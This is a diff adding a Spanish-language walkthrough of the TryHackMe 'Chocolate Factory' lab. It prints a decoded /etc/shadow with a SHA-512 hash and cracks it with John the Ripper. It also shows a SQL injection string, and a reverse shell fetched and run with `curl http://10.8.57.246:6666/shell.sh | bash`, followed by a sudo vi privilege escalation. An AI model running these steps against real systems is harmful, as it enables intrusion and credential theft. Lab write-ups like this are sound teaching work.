@@ -737,6 +737,8 @@ ftp> exit
 ```
 Aqui en este servicio me encontre una imagen que no dice gran cosa, pero la voy examinar con una herramienta normalmente usada de esteganografia.
 
+![](/assets/images/THM/chocolateFactory/2023-01-11_22-33.png)
+
 ### Steg Hide 
 
 Aqui con el siguiente comando vere un poco de informacion acerca de esta imagen y como resultado obtengo lo siguiente:
@@ -796,3 +798,234 @@ Y obtengo el siguiente texto en base 64
 ```
 Ahora con el siguiente comando lo que hice fue decodificarlo para saber que dice todo ese texto codificado.
 
+`echo "texto_codificado" | base64 -d `
+
+Con este comando pude decodificar el texto anterior y asi poder ver lo que decia claramente y este es el resultado decodificado.
+
+```
+daemon:*:18380:0:99999:7:::
+bin:*:18380:0:99999:7:::
+sys:*:18380:0:99999:7:::
+sync:*:18380:0:99999:7:::
+games:*:18380:0:99999:7:::
+man:*:18380:0:99999:7:::
+lp:*:18380:0:99999:7:::
+mail:*:18380:0:99999:7:::
+news:*:18380:0:99999:7:::
+uucp:*:18380:0:99999:7:::
+proxy:*:18380:0:99999:7:::
+www-data:*:18380:0:99999:7:::
+backup:*:18380:0:99999:7:::
+list:*:18380:0:99999:7:::
+irc:*:18380:0:99999:7:::
+gnats:*:18380:0:99999:7:::
+nobody:*:18380:0:99999:7:::
+systemd-timesync:*:18380:0:99999:7:::
+systemd-network:*:18380:0:99999:7:::
+systemd-resolve:*:18380:0:99999:7:::
+_apt:*:18380:0:99999:7:::
+mysql:!:18382:0:99999:7:::
+tss:*:18382:0:99999:7:::
+shellinabox:*:18382:0:99999:7:::
+strongswan:*:18382:0:99999:7:::
+ntp:*:18382:0:99999:7:::
+messagebus:*:18382:0:99999:7:::
+arpwatch:!:18382:0:99999:7:::
+Debian-exim:!:18382:0:99999:7:::
+uuidd:*:18382:0:99999:7:::
+debian-tor:*:18382:0:99999:7:::
+redsocks:!:18382:0:99999:7:::
+freerad:*:18382:0:99999:7:::
+iodine:*:18382:0:99999:7:::
+tcpdump:*:18382:0:99999:7:::
+miredo:*:18382:0:99999:7:::
+dnsmasq:*:18382:0:99999:7:::
+redis:*:18382:0:99999:7:::
+usbmux:*:18382:0:99999:7:::
+rtkit:*:18382:0:99999:7:::
+sshd:*:18382:0:99999:7:::
+postgres:*:18382:0:99999:7:::
+avahi:*:18382:0:99999:7:::
+stunnel4:!:18382:0:99999:7:::
+sslh:!:18382:0:99999:7:::
+nm-openvpn:*:18382:0:99999:7:::
+nm-openconnect:*:18382:0:99999:7:::
+pulse:*:18382:0:99999:7:::
+saned:*:18382:0:99999:7:::
+inetsim:*:18382:0:99999:7:::
+colord:*:18382:0:99999:7:::
+i2psvc:*:18382:0:99999:7:::
+dradis:*:18382:0:99999:7:::
+beef-xss:*:18382:0:99999:7:::
+geoclue:*:18382:0:99999:7:::
+lightdm:*:18382:0:99999:7:::
+king-phisher:*:18382:0:99999:7:::
+systemd-coredump:!!:18396::::::
+_rpc:*:18451:0:99999:7:::
+statd:*:18451:0:99999:7:::
+_gvm:*:18496:0:99999:7:::
+charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
+```
+En este resultado lo que pude ver es un archivo /etc/shadow pero codificado en base 64 y tambien vi un posible hash para el usuario "Charlie" por lo que lo guardare en un archivo para luego crackear ese hash.
+
+Por lo que para crackear ese hash tuve que usar una herramienta famosa llamada John The Ripper para poder decifrar ese hash. Este hash que comienza con "$6$" es un posible SHA-512. Asi que sabiendo eso pase a descifrarlo.
+
+### John The Ripper
+
+Con el siguiente comando empleado pude decifrar el hash para el usuario charlie:
+
+`john hash --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt`
+
+Efectivamente pude decifrar el hash y ver la contraseña para el usuario charlie como se puede ver en la imagen
+
+![](/assets/images/THM/chocolateFactory/2023-01-11_22-48.png)
+
+En este momento ya tenia un usuario y una contraseña, por lo que lo guarde en un archivo .txt y pase a enumerar el puerto 80 donde esta corriendo un servidor web, entonces abri en la web el servicio para revisar y vi lo siguiente:
+
+![](/assets/images/THM/chocolateFactory/2023-01-11_23-00.png)
+
+Aqui probe varias opciones como poner credenciales por defecto, tipo admin de usuario y admin de contraseña, probe una sql injection de tipo `' OR 1=1-- -` pero nada, por lo que pase a usar la herramienta gobuster.
+
+### Go Buster
+
+Con el siguiente comando use la fuerza bruta para enumerar posibles rutas:
+
+`gobuster dir -u http://10.10.11.164 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html -t 100 --no-error`
+
+Y este es el resultado del comando anterior.
+
+```
+> gobuster dir -u http://10.10.11.164 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 100 --no-error
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.11.164
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              txt,php,html
+[+] Timeout:                 10s
+===============================================================
+2023/01/11 23:06:48 Starting gobuster in directory enumeration mode
+===============================================================
+/home.php             (Status: 200) [Size: 569]
+/index.html           (Status: 200) [Size: 1466]
+/validate.php         (Status: 200) [Size: 93]  
+Progress: 152696 / 882244 (17.31%)             
+[!] Keyboard interrupt detected, terminating.
+                                                
+===============================================================
+2023/01/11 23:11:27 Finished
+===============================================================
+```
+
+En este punto cuando vi el resultado pase a probar en el panel de inicio de sesion las credenciales anteriormente obtenidas para ver si podia loguearme.
+
+![](/assets/images/THM/chocolateFactory/2023-01-11_23-16.png)
+
+Efectivamente pude loguearme con las credenciales, por lo que me redirigio a una pagina .php como habia visto en el resultado de gobuster, igual sin necesidad del logueo, accediendo a la ruta `/home.php` se puede acceder sin necesidad de las credenciales.
+
+![](/assets/images/THM/chocolateFactory/2023-01-11_23-17.png)
+
+Estando en esta pagina puedo escribir comandos y ejecutarlos, por lo que pase a ejecutar algunos como lo es `ls` y ver que lista y al listar ya vi un archivo que me llamo la atencion y es el siguiente.
+
+![](/assets/images/THM/chocolateFactory/2023-01-11_23-23.png)
+
+Con el comando cat intente revisar el archivo antes visto y como resultado obtuve esto.
+
+![](/assets/images/THM/chocolateFactory/2023-01-11_23-26.png)
+
+Le intente pasar el comando `strings` para ver un poco mejor el ejecutable en un formato legible y ya al ver este archivo de esta manera, pude observar otra key.
+
+![](/assets/images/THM/chocolateFactory/2023-01-11_23-28.png)
+
+En este punto decidi intentar obtener una reverse shell en bash por lo que hice lo siguiente. Me cree un archivo llamado `shell.sh` que tiene una linea de comando que ejecuta una bash en nuestra maquina y por otra parte monte un netcat de escucha para obtener la reverse shell, y por ultimo desde mi maquina monte un servidor en python, para ejecutar un comando desde la web y asi poder subir el archivo .sh y ejecutarlo desde la web.
+
+Archivo `shell.sh` con la reverse shell:
+
+![](/assets/images/THM/chocolateFactory/2023-01-11_23-35.png)
+
+Servidor en python:
+
+![](/assets/images/THM/chocolateFactory/2023-01-11_23-36.png)
+
+Netcat de escucha:
+
+![](/assets/images/THM/chocolateFactory/2023-01-11_23-39.png)
+
+Cuando ya tenia lo anterior montado, solo era ejecutar el siguiente comando desde la pagina y esperar a obtener la reverse shell en el netcat de escucha. Este el comando que ejecute desde el sitio web `curl http://10.8.57.246:6666/shell.sh | bash`
+
+![](/assets/images/THM/chocolateFactory/2023-01-11_23-43.png)
+
+Y efectivamente despues de lanzar el comando en el sitio web, obtuve la reverse shell como se muestra a continuacion.
+
+![](/assets/images/THM/chocolateFactory/2023-01-11_23-43_1.png)
+
+En este punto lo que hice, fue aplicar un tratamiento de TTY para mejorar la shell recibida y asi no perderla y trabajar mas limpio y estable.
+
+![](/assets/images/THM/chocolateFactory/2023-01-11_23-49.png)
+
+Ya teniendo una reverse shell estable, pase a examinar el directorio home y ver lo que contiene el usuario charlie y vi lo siguiente:
+
+```
+www-data@chocolate-factory:/var/www/html$ ls
+home.jpg  image.png   index.php.bak  validate.php
+home.php  index.html  key_rev_key
+www-data@chocolate-factory:/var/www/html$ cd /home/charlie/
+www-data@chocolate-factory:/home/charlie$ ls
+teleport  teleport.pub  user.txt
+www-data@chocolate-factory:/home/charlie$ ls -la
+total 40
+drwxr-xr-x 5 charlie charley 4096 Oct  7  2020 .
+drwxr-xr-x 3 root    root    4096 Oct  1  2020 ..
+-rw-r--r-- 1 charlie charley 3771 Apr  4  2018 .bashrc
+drwx------ 2 charlie charley 4096 Sep  1  2020 .cache
+drwx------ 3 charlie charley 4096 Sep  1  2020 .gnupg
+drwxrwxr-x 3 charlie charley 4096 Sep 29  2020 .local
+-rw-r--r-- 1 charlie charley  807 Apr  4  2018 .profile
+-rw-r--r-- 1 charlie charley 1675 Oct  6  2020 teleport
+-rw-r--r-- 1 charlie charley  407 Oct  6  2020 teleport.pub
+-rw-r----- 1 charlie charley   39 Oct  6  2020 user.txt
+```
+
+Lo que vi es que los archivos con nombre "teleport" son claves SSH entonces decidi usar la clave teleport para iniciar sesion con el usuario charlie por el servicio SSH, y el comando que use para revisar esa parte fue, pero antes de ejecutar el servicio tuve que darle ciertos permiso al archivo teleport con el siguiente comando y ahi si ejecutar el servicio.
+
+`chmod 600 teleport`
+
+`ssh -i teleport charlie@IP-objetivo`
+
+![](/assets/images/THM/chocolateFactory/2023-01-11_23-59.png)
+
+En este punto ya podia revisar la flag de usuario como muestro en la siguiente imagen.
+
+![](/assets/images/THM/chocolateFactory/2023-01-12_00-02.png)
+
+Ya lo siguiente es escalar privilegios
+
+## Escalada de privilegios
+
+En este punto usando el siguiente comando `sudo -l` puedo ver si hay un comando o binario que el usuario tenga que tenga permiso para ser ejecutado como root y el resultado de lanzar ese comando fue lo siguiente:
+
+![](/assets/images/THM/chocolateFactory/2023-01-12_00-08.png)
+
+El resultado que veo es que si puedo ejecutar el binario "vi" como root por el usuario charlie. Por lo que haciendo uso de una web reconocida llamada GtfoBins, un recurso bastante util, pude encontrar un comando para escalar los privilegios de sudo.
+
+El comando que encontre es el siguiente:
+
+![](/assets/images/THM/chocolateFactory/2023-01-12_00-13.png)
+
+Asi que pase a ejecutarlo y efectivamente tuve la escalada de privilegios a usuario root.
+
+![](/assets/images/THM/chocolateFactory/2023-01-12_00-16.png)
+
+Por lo tanto ya puedo obtener la flag de usuario root y finalizar este CTF.
+
+![](/assets/images/THM/chocolateFactory/2023-01-12_00-18.png)
+
+Pero hay un pero, y es que no hay un archivo .txt, si no que hay un archivo .py por lo que si recuerdo anteriormente habia encontrado una key en el archivo ejecutable `key_rev_key`, asi que intente colocar esa key y ahora si pude obtener la flag de usuario root.
+
+![](/assets/images/THM/chocolateFactory/2023-01-12_00-23.png)
